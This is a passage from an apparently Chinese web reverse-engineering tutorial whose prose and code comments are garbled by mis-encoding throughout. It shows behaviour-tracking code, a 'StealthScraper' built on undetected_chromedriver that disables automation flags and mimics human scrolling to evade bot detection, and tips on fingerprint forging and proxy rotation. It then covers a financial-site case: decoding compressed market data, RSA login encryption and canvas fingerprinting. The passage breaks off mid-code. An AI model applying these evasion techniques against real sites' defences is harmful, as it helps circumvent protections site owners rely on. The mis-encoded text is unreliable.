      <h4 id="3-æ‰¹é‡ä¸ŠæŠ¥ä¼˜åŒ–">3. æ‰¹é‡ä¸ŠæŠ¥ä¼˜åŒ–</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ‰¹é‡æ”¶é›†äº‹ä»¶</span>
<span class="kd">let</span><span class="w"> </span><span class="nx">eventQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">trackEvent</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">event</span><span class="p">.</span><span class="nx">timestamp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Date</span><span class="p">.</span><span class="nx">now</span><span class="p">();</span>
<span class="w">    </span><span class="nx">eventQueue</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">event</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è¾¾åˆ°é˜ˆå€¼æˆ–è¶…æ—¶åæ‰¹é‡å‘é€</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">eventQueue</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">10</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">flushEvents</span><span class="p">();</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">flushEvents</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">eventQueue</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>

<span class="w">    </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/behavior&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
<span class="w">        </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/json&#39;</span><span class="p">},</span>
<span class="w">        </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">({</span>
<span class="w">            </span><span class="nx">session_id</span><span class="o">:</span><span class="w"> </span><span class="nx">sessionId</span><span class="p">,</span>
<span class="w">            </span><span class="nx">events</span><span class="o">:</span><span class="w"> </span><span class="nx">eventQueue</span>
<span class="w">        </span><span class="p">})</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="nx">eventQueue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[];</span>
<span class="p">}</span>

<span class="c1">// å®šæ—¶åˆ·æ–°</span>
<span class="nx">setInterval</span><span class="p">(</span><span class="nx">flushEvents</span><span class="p">,</span><span class="w"> </span><span class="mf">30000</span><span class="p">);</span><span class="w">  </span><span class="c1">// æ¯30ç§’</span>

<span class="c1">// é¡µé¢å¸è½½æ—¶å‘é€</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;beforeunload&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">flushEvents</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="åçˆ¬è™«å¯¹æŠ—">åçˆ¬è™«å¯¹æŠ—</h2>

      <h3 id="å¸¸è§æ£€æµ‹æ‰‹æ®µ">å¸¸è§æ£€æµ‹æ‰‹æ®µ</h3>

      <ol>
        <li>
          <p><strong>é¢‘ç‡é™åˆ¶</strong></p>

          <ul>
            <li>å• IP æ¯åˆ†é’Ÿè¯·æ±‚é™åˆ¶</li>
            <li>è´¦å·æ¯æ—¥çˆ¬å–ä¸Šé™</li>
          </ul>
        </li>
        <li>
          <p><strong>è¡Œä¸ºåˆ†æ</strong></p>

          <ul>
            <li>é¼ æ ‡ç§»åŠ¨è½¨è¿¹</li>
            <li>æ»šåŠ¨è¡Œä¸º</li>
            <li>åœç•™æ—¶é—´åˆ†å¸ƒ</li>
          </ul>
        </li>
        <li>
          <p><strong>è®¾å¤‡æŒ‡çº¹</strong></p>

          <ul>
            <li>Canvas æŒ‡çº¹</li>
            <li>WebGL æŒ‡çº¹</li>
            <li>å­—ä½“æŒ‡çº¹</li>
          </ul>
        </li>
        <li>
          <p><strong>éªŒè¯ç </strong></p>

          <ul>
            <li>æ»‘å—éªŒè¯</li>
            <li>å›¾ç‰‡è¯†åˆ«</li>
            <li>è¡Œä¸ºéªŒè¯</li>
          </ul>
        </li>
      </ol>

      <h3 id="ç»•è¿‡ç­–ç•¥">ç»•è¿‡ç­–ç•¥</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">undetected_chromedriver</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">uc</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">selenium.webdriver.common.by</span><span class="w"> </span><span class="kn">import</span> <span class="n">By</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">random</span>

<span class="k">class</span><span class="w"> </span><span class="nc">StealthScraper</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># ä½¿ç”¨ undetected-chromedriver ç»•è¿‡æ£€æµ‹</span>
        <span class="n">options</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">ChromeOptions</span><span class="p">()</span>
        <span class="n">options</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--disable-blink-features=AutomationControlled&#39;</span><span class="p">)</span>

        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span> <span class="o">=</span> <span class="n">uc</span><span class="o">.</span><span class="n">Chrome</span><span class="p">(</span><span class="n">options</span><span class="o">=</span><span class="n">options</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">human_like_scroll</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¨¡æ‹ŸçœŸäººæ»šåŠ¨&quot;&quot;&quot;</span>
        <span class="c1"># éšæœºæ»šåŠ¨è·ç¦»</span>
        <span class="n">scroll_distance</span> <span class="o">=</span> <span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">300</span><span class="p">,</span> <span class="mi">700</span><span class="p">)</span>

        <span class="c1"># åˆ†å¤šæ¬¡æ»šåŠ¨ï¼ˆæ¨¡æ‹ŸçœŸäººï¼‰</span>
        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">6</span><span class="p">)):</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">execute_script</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;window.scrollBy(0, </span><span class="si">{</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">50</span><span class="p">,</span><span class="w"> </span><span class="mi">150</span><span class="p">)</span><span class="si">}</span><span class="s2">)&quot;</span><span class="p">)</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mf">0.1</span><span class="p">,</span> <span class="mf">0.3</span><span class="p">))</span>

        <span class="c1"># åœé¡¿</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">3</span><span class="p">))</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">scrape_feed</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;çˆ¬å–ä¿¡æ¯æµ&quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://example.com/feed&#39;</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>

        <span class="n">posts</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">page</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
            <span class="c1"># æ¨¡æ‹ŸçœŸäººæ»šåŠ¨</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">human_like_scroll</span><span class="p">()</span>

            <span class="c1"># æå–å¸–å­</span>
            <span class="n">post_elements</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">driver</span><span class="o">.</span><span class="n">find_elements</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;post&#39;</span><span class="p">)</span>
            <span class="k">for</span> <span class="n">elem</span> <span class="ow">in</span> <span class="n">post_elements</span><span class="p">:</span>
                <span class="n">posts</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                    <span class="s1">&#39;id&#39;</span><span class="p">:</span> <span class="n">elem</span><span class="o">.</span><span class="n">get_attribute</span><span class="p">(</span><span class="s1">&#39;data-post-id&#39;</span><span class="p">),</span>
                    <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">elem</span><span class="o">.</span><span class="n">find_element</span><span class="p">(</span><span class="n">By</span><span class="o">.</span><span class="n">CLASS_NAME</span><span class="p">,</span> <span class="s1">&#39;text&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
                <span class="p">})</span>

            <span class="c1"># éšæœºåœé¡¿</span>
            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">uniform</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">5</span><span class="p">))</span>

        <span class="k">return</span> <span class="n">posts</span>

<span class="c1"># ä½¿ç”¨</span>
<span class="n">scraper</span> <span class="o">=</span> <span class="n">StealthScraper</span><span class="p">()</span>
<span class="n">posts</span> <span class="o">=</span> <span class="n">scraper</span><span class="o">.</span><span class="n">scrape_feed</span><span class="p">()</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>ç¤¾äº¤åª’ä½“é€†å‘çš„å…³é”®æŠ€æœ¯ï¼š</p>

      <ol>
        <li>
          <p><strong>åˆ†é¡µæœºåˆ¶ç†è§£</strong></p>

          <ul>
            <li>æ¸¸æ ‡åˆ†é¡µ</li>
            <li>æ—¶é—´æˆ³åˆ†é¡µ</li>
            <li>ID åˆ†é¡µ</li>
          </ul>
        </li>
        <li>
          <p><strong>API é€†å‘</strong></p>

          <ul>
            <li>REST API</li>
            <li>GraphQL</li>
            <li>WebSocket</li>
          </ul>
        </li>
        <li>
          <p><strong>ç­¾åä¸åŠ å¯†</strong></p>

          <ul>
            <li>URL ç­¾å</li>
            <li>å‚æ•°åŠ å¯†</li>
            <li>Token ç”Ÿæˆ</li>
          </ul>
        </li>
        <li>
          <p><strong>è¡Œä¸ºæ¨¡æ‹Ÿ</strong></p>

          <ul>
            <li>é¼ æ ‡è½¨è¿¹</li>
            <li>æ»šåŠ¨è¡Œä¸º</li>
            <li>éšæœºå»¶è¿Ÿ</li>
          </ul>
        </li>
        <li>
          <p><strong>åæ£€æµ‹</strong></p>

          <ul>
            <li>è®¾å¤‡æŒ‡çº¹ä¼ªé€ </li>
            <li>ä»£ç†è½®æ¢</li>
            <li>æ— å¤´æµè§ˆå™¨æ£€æµ‹ç»•è¿‡</li>
          </ul>
        </li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="../02-Techniques/graphql_analysis.md">GraphQL API åˆ†æ</a></li>
        <li><a href="../02-Techniques/websocket_analysis.md">WebSocket é€šä¿¡åˆ†æ</a></li>
        <li><a href="../02-Techniques/infinite_scroll.md">æ— é™æ»šåŠ¨åŠ è½½</a></li>
        <li><a href="../03-Advanced-Topics/device_fingerprinting.md">è®¾å¤‡æŒ‡çº¹è¯†åˆ«</a></li>
      </ul>

    </div>

    <div class="section" id="05-Case-Studies-case-financial">
      <h2>47. Financial Websites</h2>
      <h1 id="é‡‘èç½‘ç«™é€†å‘æ¡ˆä¾‹">é‡‘èç½‘ç«™é€†å‘æ¡ˆä¾‹</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>é‡‘èç½‘ç«™é€šå¸¸å…·æœ‰æé«˜çš„å®‰å…¨è¦æ±‚ï¼ŒåŒ…æ‹¬å¤šå±‚åŠ å¯†ã€åŠ¨æ€ä»¤ç‰Œã€è®¾å¤‡æŒ‡çº¹ã€è¡Œä¸ºåˆ†æç­‰ã€‚æœ¬æ–‡é€šè¿‡çœŸå®æ¡ˆä¾‹ä»‹ç»é‡‘èç½‘ç«™çš„é€†å‘åˆ†ææ–¹æ³•å’Œå®‰å…¨æœºåˆ¶ã€‚</p>

      <hr />

      <h2 id="æ¡ˆä¾‹ä¸€è‚¡ç¥¨è¡Œæƒ…æ•°æ®åŠ å¯†">æ¡ˆä¾‹ä¸€ï¼šè‚¡ç¥¨è¡Œæƒ…æ•°æ®åŠ å¯†</h2>

      <h3 id="èƒŒæ™¯">èƒŒæ™¯</h3>

      <p>æŸè‚¡ç¥¨äº¤æ˜“å¹³å°çš„å®æ—¶è¡Œæƒ…æ¥å£è¿”å›åŠ å¯†æ•°æ®ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;code&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;600000&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eJyNVE1v2zAM/SuBzs4h...&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1702800000</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>å‰ç«¯èƒ½å®æ—¶æ˜¾ç¤ºè‚¡ä»·ã€æ¶¨è·Œå¹…ç­‰ä¿¡æ¯ï¼Œè¯´æ˜å­˜åœ¨è§£å¯†é€»è¾‘ã€‚</p>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æ">1. æŠ“åŒ…åˆ†æ</h4>

      <p>ä½¿ç”¨ Chrome DevTools è§‚å¯Ÿ WebSocket é€šä¿¡ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ‰“å¼€æ§åˆ¶å°</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">ws</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">WebSocket</span><span class="p">(</span><span class="s1">&#39;wss://stock.example.com/realtime&#39;</span><span class="p">);</span>

<span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">event</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Raw data:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">data</span><span class="p">);</span>
<span class="w">    </span><span class="c1">// {&quot;code&quot;:&quot;600000&quot;,&quot;data&quot;:&quot;eJyNVE1v2zAM...&quot;,&quot;timestamp&quot;:1702800000}</span>
<span class="p">};</span>
</code></pre>
      </div>

      <h4 id="2-å®šä½è§£å¯†å‡½æ•°">2. å®šä½è§£å¯†å‡½æ•°</h4>

      <p><strong>æ–¹æ³•ï¼šæœç´¢å…³é”®è¯</strong></p>

      <p>åœ¨ Sources é¢æ¿å…¨å±€æœç´¢ï¼š</p>

      <ul>
        <li><code>"data"</code> å­—æ®µè®¿é—®</li>
        <li><code>decompress</code></li>
        <li><code>inflate</code></li>
        <li><code>pako</code> (å¸¸è§å‹ç¼©åº“)</li>
      </ul>

      <p>æ‰¾åˆ°è§£å¯†ä»£ç ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">decodeMarketData</span><span class="p">(</span><span class="nx">encryptedData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// 1. Base64 è§£ç </span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">compressed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">atob</span><span class="p">(</span><span class="nx">encryptedData</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// 2. ä½¿ç”¨ pako è§£å‹ç¼© (GZIP)</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">binaryData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">pako</span><span class="p">.</span><span class="nx">inflate</span><span class="p">(</span><span class="nx">compressed</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">to</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;string&#39;</span><span class="w"> </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// 3. JSON è§£æ</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">binaryData</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="3-python-å®ç°">3. Python å®ç°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">base64</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">gzip</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">def</span><span class="w"> </span><span class="nf">decode_market_data</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">):</span>
    <span class="c1"># Base64 è§£ç </span>
    <span class="n">compressed</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">)</span>

    <span class="c1"># GZIP è§£å‹</span>
    <span class="n">decompressed</span> <span class="o">=</span> <span class="n">gzip</span><span class="o">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">compressed</span><span class="p">)</span>

    <span class="c1"># JSON è§£æ</span>
    <span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">decompressed</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>

<span class="c1"># æµ‹è¯•</span>
<span class="n">encrypted</span> <span class="o">=</span> <span class="s2">&quot;eJyNVE1v2zAM/SuBzs4h...&quot;</span>
<span class="n">data</span> <span class="o">=</span> <span class="n">decode_market_data</span><span class="p">(</span><span class="n">encrypted</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="c1"># {</span>
<span class="c1">#     &quot;price&quot;: 13.56,</span>
<span class="c1">#     &quot;change&quot;: 0.23,</span>
<span class="c1">#     &quot;volume&quot;: 1234567,</span>
<span class="c1">#     ...</span>
<span class="c1"># }</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹äºŒç™»å½•åŠ å¯†ä¸åŒå› ç´ è®¤è¯">æ¡ˆä¾‹äºŒï¼šç™»å½•åŠ å¯†ä¸åŒå› ç´ è®¤è¯</h2>

      <h3 id="èƒŒæ™¯-2">èƒŒæ™¯</h3>

      <p>æŸç½‘é“¶ç™»å½•æµç¨‹ï¼š</p>

      <ol>
        <li>è¾“å…¥ç”¨æˆ·åå¯†ç </li>
        <li>å¯†ç éœ€è¦åŠ å¯†ä¼ è¾“</li>
        <li>éœ€è¦çŸ­ä¿¡éªŒè¯ç ï¼ˆåŒå› ç´ è®¤è¯ï¼‰</li>
        <li>ç™»å½•æˆåŠŸåè·å– Token</li>
      </ol>

      <hr />

      <h3 id="é€†å‘æ­¥éª¤-2">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æç™»å½•è¯·æ±‚">1. æŠ“åŒ…åˆ†æç™»å½•è¯·æ±‚</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/json</span>

<span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;username&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;user123&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;password_enc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;MIGfMA0GCSqGSIb3DQEBA...&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;device_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;uuid-1234-5678&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1702800000</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;sign&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;e10adc3949ba59abbe56e057f20f883e&quot;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-åˆ†æå¯†ç åŠ å¯†">2. åˆ†æå¯†ç åŠ å¯†</h4>

      <p>åœ¨ç™»å½•æŒ‰é’®ç‚¹å‡»äº‹ä»¶ä¸Šè®¾ç½®æ–­ç‚¹ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ‰¾åˆ°åŠ å¯†å‡½æ•°</span>
<span class="kd">function</span><span class="w"> </span><span class="nx">encryptPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">publicKey</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ä½¿ç”¨ RSA å…¬é’¥åŠ å¯†</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">JSEncrypt</span><span class="p">();</span>
<span class="w">    </span><span class="nx">encrypt</span><span class="p">.</span><span class="nx">setPublicKey</span><span class="p">(</span><span class="nx">publicKey</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">.</span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">password</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// å…¬é’¥ä»æœåŠ¡å™¨è·å–</span>
<span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/api/public-key&#39;</span><span class="p">)</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">res</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">res</span><span class="p">.</span><span class="nx">json</span><span class="p">())</span>
<span class="w">    </span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">data</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">publicKey</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">public_key</span><span class="p">;</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">encryptedPwd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encryptPassword</span><span class="p">(</span><span class="nx">password</span><span class="p">,</span><span class="w"> </span><span class="nx">publicKey</span><span class="p">);</span>
<span class="w">        </span><span class="c1">// å‘é€ç™»å½•è¯·æ±‚</span>
<span class="w">    </span><span class="p">});</span>
</code></pre>
      </div>

      <p><strong>å…¬é’¥ç¤ºä¾‹</strong>:</p>

      <pre><code>-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC...
-----END PUBLIC KEY-----
</code></pre>

      <h4 id="3-è®¾å¤‡æŒ‡çº¹ç”Ÿæˆ">3. è®¾å¤‡æŒ‡çº¹ç”Ÿæˆ</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">generateDeviceId</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">fingerprint</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">userAgent</span><span class="o">:</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">userAgent</span><span class="p">,</span>
<span class="w">        </span><span class="nx">language</span><span class="o">:</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">language</span><span class="p">,</span>
<span class="w">        </span><span class="nx">platform</span><span class="o">:</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">platform</span><span class="p">,</span>
<span class="w">        </span><span class="nx">screen</span><span class="o">:</span><span class="w"> </span><span class="sb">`</span><span class="si">${</span><span class="nx">screen</span><span class="p">.</span><span class="nx">width</span><span class="si">}</span><span class="sb">x</span><span class="si">${</span><span class="nx">screen</span><span class="p">.</span><span class="nx">height</span><span class="si">}</span><span class="sb">`</span><span class="p">,</span>
<span class="w">        </span><span class="nx">timezone</span><span class="o">:</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">().</span><span class="nx">getTimezoneOffset</span><span class="p">(),</span>
<span class="w">        </span><span class="nx">plugins</span><span class="o">:</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">plugins</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">p</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">p</span><span class="p">.</span><span class="nx">name</span><span class="p">).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">),</span>
<span class="w">        </span><span class="nx">canvas</span><span class="o">:</span><span class="w"> </span><span class="nx">getCanvasFingerprint</span><span class="p">()</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="c1">// ç”Ÿæˆå”¯ä¸€ ID</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">fingerprint</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">md5</span><span class="p">(</span><span class="nx">str</span><span class="p">);</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">getCanvasFingerprint</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">canvas</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;canvas&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">ctx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">getContext</span><span class="p">(</span><span class="s1">&#39;2d&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">textBaseline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;top&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">font</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;14px Arial&#39;</span><span class="p">;</span>
<span class="w">    </span><span class="nx">ctx</span><span class="p">.</span><span class="nx">fillText</span><span class="p">(</span><span class="s1">&#39;Device Fingerprint&#39;</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">canvas</span><span class="p">.</span><span class="nx">toDataURL</span><span class="p">();</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="4-python-å®Œæ•´å®ç°">4. Python å®Œæ•´å®ç°</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
